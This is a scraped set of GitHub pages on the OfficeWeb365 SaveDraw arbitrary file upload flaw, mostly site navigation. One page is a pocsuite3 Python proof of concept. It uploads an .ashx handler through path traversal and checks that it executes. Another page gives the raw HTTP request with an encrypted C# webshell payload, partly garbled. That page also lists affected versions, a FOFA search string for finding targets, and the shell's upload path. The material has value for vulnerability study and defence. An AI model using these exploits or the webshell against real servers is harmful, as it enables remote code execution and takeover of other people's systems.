=== Content from github.com_137b32cd_20250114_205409.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPeiQi0%2FPeiQi-WIKI-Book%2Fblob%2F32024c5dbb7ff60fa7347cccf6ebb3763a513e7a%2Fdocs%2Fwiki%2Fwebapp%2FOfficeWeb365%2FOfficeWeb365%2520SaveDraw%2520%25E4%25BB%25BB%25E6%2584%258F%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E6%25BC%258F%25E6%25B4%259E.md%3Fplain%3D1)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPeiQi0%2FPeiQi-WIKI-Book%2Fblob%2F32024c5dbb7ff60fa7347cccf6ebb3763a513e7a%2Fdocs%2Fwiki%2Fwebapp%2FOfficeWeb365%2FOfficeWeb365%2520SaveDraw%2520%25E4%25BB%25BB%25E6%2584%258F%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E6%25BC%258F%25E6%25B4%259E.md%3Fplain%3D1)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=PeiQi0%2FPeiQi-WIKI-Book)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PeiQi0](/PeiQi0)
/
**[PeiQi-WIKI-Book](/PeiQi0/PeiQi-WIKI-Book)**
Public

* [Notifications](/login?return_to=%2FPeiQi0%2FPeiQi-WIKI-Book) You must be signed in to change notification settings
* [Fork
  599](/login?return_to=%2FPeiQi0%2FPeiQi-WIKI-Book)
* [Star
   3.9k](/login?return_to=%2FPeiQi0%2FPeiQi-WIKI-Book)

* [Code](/PeiQi0/PeiQi-WIKI-Book)
* [Issues
  1](/PeiQi0/PeiQi-WIKI-Book/issues)
* [Pull requests
  0](/PeiQi0/PeiQi-WIKI-Book/pulls)
* [Actions](/PeiQi0/PeiQi-WIKI-Book/actions)
* [Projects
  0](/PeiQi0/PeiQi-WIKI-Book/projects)
* [Wiki](/PeiQi0/PeiQi-WIKI-Book/wiki)
* [Security](/PeiQi0/PeiQi-WIKI-Book/security)
* [Insights](/PeiQi0/PeiQi-WIKI-Book/pulse)

Additional navigation options

* [Code](/PeiQi0/PeiQi-WIKI-Book)
* [Issues](/PeiQi0/PeiQi-WIKI-Book/issues)
* [Pull requests](/PeiQi0/PeiQi-WIKI-Book/pulls)
* [Actions](/PeiQi0/PeiQi-WIKI-Book/actions)
* [Projects](/PeiQi0/PeiQi-WIKI-Book/projects)
* [Wiki](/PeiQi0/PeiQi-WIKI-Book/wiki)
* [Security](/PeiQi0/PeiQi-WIKI-Book/security)
* [Insights](/PeiQi0/PeiQi-WIKI-Book/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from avd.aliyun.com_73049f5f_20250114_205408.html ===
{"\_waf\_bd8ce2ce37":"0+Tb2bDrqvSW5/U7e90OPBVWuL12PT2LrvhXznbfo9A="}

=== Content from github.com_3134f1ec_20250114_205411.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fluck-ying%2FLibrary-POC%2Fblob%2Fmaster%2F2023HW%2F2023.8.15%2FOfficeWeb365_SaveDraw%25E4%25BB%25BB%25E6%2584%258F%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E6%25BC%258F%25E6%25B4%259E.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fluck-ying%2FLibrary-POC%2Fblob%2Fmaster%2F2023HW%2F2023.8.15%2FOfficeWeb365_SaveDraw%25E4%25BB%25BB%25E6%2584%258F%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E6%25BC%258F%25E6%25B4%259E.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=luck-ying%2FLibrary-POC)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[luck-ying](/luck-ying)
/
**[Library-POC](/luck-ying/Library-POC)**
Public

* [Notifications](/login?return_to=%2Fluck-ying%2FLibrary-POC) You must be signed in to change notification settings
* [Fork
  197](/login?return_to=%2Fluck-ying%2FLibrary-POC)
* [Star
   855](/login?return_to=%2Fluck-ying%2FLibrary-POC)

* [Code](/luck-ying/Library-POC)
* [Issues
  0](/luck-ying/Library-POC/issues)
* [Pull requests
  1](/luck-ying/Library-POC/pulls)
* [Actions](/luck-ying/Library-POC/actions)
* [Projects
  0](/luck-ying/Library-POC/projects)
* [Security](/luck-ying/Library-POC/security)
* [Insights](/luck-ying/Library-POC/pulse)

Additional navigation options

* [Code](/luck-ying/Library-POC)
* [Issues](/luck-ying/Library-POC/issues)
* [Pull requests](/luck-ying/Library-POC/pulls)
* [Actions](/luck-ying/Library-POC/actions)
* [Projects](/luck-ying/Library-POC/projects)
* [Security](/luck-ying/Library-POC/security)
* [Insights](/luck-ying/Library-POC/pulse)

## Files

 master
## Breadcrumbs

1. [Library-POC](/luck-ying/Library-POC/tree/master)
2. /[2023HW](/luck-ying/Library-POC/tree/master/2023HW)
3. /[2023.8.15](/luck-ying/Library-POC/tree/master/2023HW/2023.8.15)
/
# OfficeWeb365\_SaveDraw任意文件上传漏洞.py

Copy path Blame  Blame
## Latest commit

## History

[History](/luck-ying/Library-POC/commits/master/2023HW/2023.8.15/OfficeWeb365_SaveDraw%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.py)123 lines (116 loc) · 4.88 KB master
## Breadcrumbs

1. [Library-POC](/luck-ying/Library-POC/tree/master)
2. /[2023HW](/luck-ying/Library-POC/tree/master/2023HW)
3. /[2023.8.15](/luck-ying/Library-POC/tree/master/2023HW/2023.8.15)
/
# OfficeWeb365\_SaveDraw任意文件上传漏洞.py

Top
## File metadata and controls

* Code
* Blame

123 lines (116 loc) · 4.88 KB[Raw](https://github.com/luck-ying/Library-POC/raw/refs/heads/master/2023HW/2023.8.15/OfficeWeb365_SaveDraw%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#!/usr/bin/env python# coding: utf-8from collections import OrderedDictfrom urllib.parse import urljoinimport re,random,hashlib,base64from pocsuite3.api import POCBase, Output, register\_poc, logger, requests, OptDict, OptString, VUL\_TYPEfrom pocsuite3.api import REVERSE\_PAYLOAD, POC\_CATEGORY
class POC(POCBase): vulID = '0' # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0 version = '1' #默认为1 author = [''] # PoC作者的大名 vulDate = '2023-08-15' #漏洞公开的时间,不知道就写今天 createDate = '2023-08-15' # 编写 PoC 的日期 updateDate = '2023-08-15' # PoC 更新的时间,默认和编写时间一样 references = [''] # 漏洞地址来源,0day不用写 name = '' # PoC 名称 appPowerLink = '' # 漏洞厂商主页地址 appName = '' # 漏洞应用名称 appVersion = '''''' # 漏洞影响版本 vulType = VUL\_TYPE.UPLOAD\_FILES #漏洞类型,类型参考见 漏洞类型规范表 desc = ''' fofa:"OfficeWeb365" OfficeWeb365 SaveDraw 接口存在任意文件上传漏洞，攻击者通过漏洞可以在服务器中上传任意文件获取服务器权限 ''' # 漏洞简要描述 samples = [''] # 测试样列,就是用 PoC 测试成功的网站 install\_requires = [''] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写 pocDesc = ''' 检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify  ''' category = POC\_CATEGORY.EXPLOITS.REMOTE # 生成任意8位字符  def generate\_random\_string(selff,length=8):  chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  return ''.join(random.choice(chars) for \_ in range(length)) # 使用MD5加密  def md5\_encrypt(self,text):  m = hashlib.md5()  m.update(text.encode('utf-8'))  return m.hexdigest() def \_verify(self): # 生成随机字符串并md5加密  random\_string = self.generate\_random\_string()  encrypted\_string = self.md5\_encrypt(random\_string)  # base64编码 # 原始字符串  original\_string = encrypted\_string # 将字符串转换为字节  original\_bytes = original\_string.encode('utf8')  # 使用Base64编码  encoded\_bytes = base64.b64encode(original\_bytes).decode() result = {} path ="/PW/SaveDraw?path=../../Content/img&idx=6.ashx" headers={ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded' } payload ='''data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ WebHandler Language="C#" Class="Handler" %>using System;using System.IO;using System.Reflection;using System.Text;using System.Web;using System.Web.SessionState;using System.Security.Cryptography;public class Handler : IHttpHandler, IRequiresSessionState{ public void ProcessRequest(HttpContext context)  {  string input = "'''+str(encoded\_bytes)+'''";  byte[] inputBytes = Convert.FromBase64String(input);  context.Response.BinaryWrite(inputBytes);  File.Delete(context.Server.MapPath(context.Request.FilePath)); }  public bool IsReusable  {  get  {  return false;  }  } }---''' try:  resq = requests.post(url=self.url+path,headers=headers,data=payload,timeout=5,verify=False,allow\_redirects=False) if resq.status\_code == 200 and 'ok' in resq.text: shell\_path = '/Content/img/UserDraw/drawPW6.ashx' #print(shell\_path) resq\_2 = requests.get(url=self.url+shell\_path,headers=headers,timeout=5,verify=False) if encrypted\_string in resq\_2.text: result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = self.url + path result['VerifyInfo']['shell\_path'] = self.url + shell\_path except Exception as e: return return self.parse\_output(result)
 def \_attack(self): return self.\_verify() def parse\_attack(self, result): output = Output(self) if result: output.success(result) else: output.fail('target is not vulnerable') return output
 def \_shell(self): return
 def parse\_output(self, result): output = Output(self) if result: output.success(result) else: output.fail('target is not vulnerable') return output register\_poc(POC)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e06aee67_20250114_205412.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxuetang1125%2FOfficeWeb365%2Fblob%2Fmain%2FOfficeWeb365%2520SaveDraw%2520%25E4%25BB%25BB%25E6%2584%258F%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E6%25BC%258F%25E6%25B4%259E%2520%25282%2529.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxuetang1125%2FOfficeWeb365%2Fblob%2Fmain%2FOfficeWeb365%2520SaveDraw%2520%25E4%25BB%25BB%25E6%2584%258F%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E6%25BC%258F%25E6%25B4%259E%2520%25282%2529.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=xuetang1125%2FOfficeWeb365)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[xuetang1125](/xuetang1125)
/
**[OfficeWeb365](/xuetang1125/OfficeWeb365)**
Public

* [Notifications](/login?return_to=%2Fxuetang1125%2FOfficeWeb365) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fxuetang1125%2FOfficeWeb365)
* [Star
   0](/login?return_to=%2Fxuetang1125%2FOfficeWeb365)

* [Code](/xuetang1125/OfficeWeb365)
* [Issues
  0](/xuetang1125/OfficeWeb365/issues)
* [Pull requests
  0](/xuetang1125/OfficeWeb365/pulls)
* [Actions](/xuetang1125/OfficeWeb365/actions)
* [Projects
  0](/xuetang1125/OfficeWeb365/projects)
* [Security](/xuetang1125/OfficeWeb365/security)
* [Insights](/xuetang1125/OfficeWeb365/pulse)

Additional navigation options

* [Code](/xuetang1125/OfficeWeb365)
* [Issues](/xuetang1125/OfficeWeb365/issues)
* [Pull requests](/xuetang1125/OfficeWeb365/pulls)
* [Actions](/xuetang1125/OfficeWeb365/actions)
* [Projects](/xuetang1125/OfficeWeb365/projects)
* [Security](/xuetang1125/OfficeWeb365/security)
* [Insights](/xuetang1125/OfficeWeb365/pulse)

## Files

 main
## Breadcrumbs

1. [OfficeWeb365](/xuetang1125/OfficeWeb365/tree/main)
/
# OfficeWeb365 SaveDraw 任意文件上传漏洞 (2).md

Copy path Blame  Blame
## Latest commit

## History

[History](/xuetang1125/OfficeWeb365/commits/main/OfficeWeb365%20SaveDraw%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20%282%29.md)43 lines (26 loc) · 1.86 KB main
## Breadcrumbs

1. [OfficeWeb365](/xuetang1125/OfficeWeb365/tree/main)
/
# OfficeWeb365 SaveDraw 任意文件上传漏洞 (2).md

Top
## File metadata and controls

* Preview
* Code
* Blame

43 lines (26 loc) · 1.86 KB[Raw](https://github.com/xuetang1125/OfficeWeb365/raw/refs/heads/main/OfficeWeb365%20SaveDraw%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20%282%29.md)
# OfficeWeb365 SaveDraw 任意文件上传漏洞

## Impacted version: V8.6.1.0 V7.18.23.0

## recommendation: updated to latest version & verify file uploads

## credit goes to PeiQi0

## 漏洞描述

OfficeWeb365 SaveDraw 接口存在任意文件上传漏洞，攻击者通过漏洞可以在服务器中上传任意文件获取服务器权限

## 漏洞影响

OfficeWeb365

## 网络测绘

"OfficeWeb365"

## 漏洞复现

验证POC

```
POST /PW/SaveDraw?path=../../Content/img&idx=6.ashx HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.434.18 Safari/537.36
Content-Length: 990
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ WebHandler Language="C#" Class="Handler" %>using System;using System.I0;using System.Reflection;using System.Text;using System.Web;using System.WebSessionState;using&System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void=&ProcessRequest(HttpContext context){try{string key="900bc885d7553375";byteDk=&Encoding.Default.GetBytes(key);context.Session.AddC"sky", key);StreamReader sr=new&StreamReader(contextRequest.InputStream);string line=sr.ReadLine;if(!string.IsNullOrEmpty(line)){byteDc=&Convert.FromBase64String(line);Assembly assembly=&typeof(Environment).Assembly;RijndaelManaged rm=(RijndaelManaged)&assembly.CreateInstance("System.Secur"+"ityCrypto"+"graphy.Rijnda"+"elm anaged");byte[ data=rm.CreateDecryptorCk,k)TransformFinalBlock(c,0, c.Length);Assembly.Load(data)CreateInstance("U").Equals(context);sr.clo se();}}catch {}}public bool IsReusable{get{return false;}}}}---
```

上传地址

```
/Content/img/UserDraw/drawPW6.ashx
```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2ee9c705_20250114_205410.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FThreekiii%2FVulnerability-Wiki%2Fblob%2Fmaster%2Fdocs-base%2Fdocs%2Fwebapp%2FOfficeWeb365-SaveDraw-%25E4%25BB%25BB%25E6%2584%258F%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E6%25BC%258F%25E6%25B4%259E.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FThreekiii%2FVulnerability-Wiki%2Fblob%2Fmaster%2Fdocs-base%2Fdocs%2Fwebapp%2FOfficeWeb365-SaveDraw-%25E4%25BB%25BB%25E6%2584%258F%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E6%25BC%258F%25E6%25B4%259E.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Threekiii%2FVulnerability-Wiki)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Threekiii](/Threekiii)
/
**[Vulnerability-Wiki](/Threekiii/Vulnerability-Wiki)**
Public

* [Notifications](/login?return_to=%2FThreekiii%2FVulnerability-Wiki) You must be signed in to change notification settings
* [Fork
  341](/login?return_to=%2FThreekiii%2FVulnerability-Wiki)
* [Star
   1.7k](/login?return_to=%2FThreekiii%2FVulnerability-Wiki)

* [Code](/Threekiii/Vulnerability-Wiki)
* [Issues
  0](/Threekiii/Vulnerability-Wiki/issues)
* [Pull requests
  0](/Threekiii/Vulnerability-Wiki/pulls)
* [Actions](/Threekiii/Vulnerability-Wiki/actions)
* [Projects
  0](/Threekiii/Vulnerability-Wiki/projects)
* [Security](/Threekiii/Vulnerability-Wiki/security)
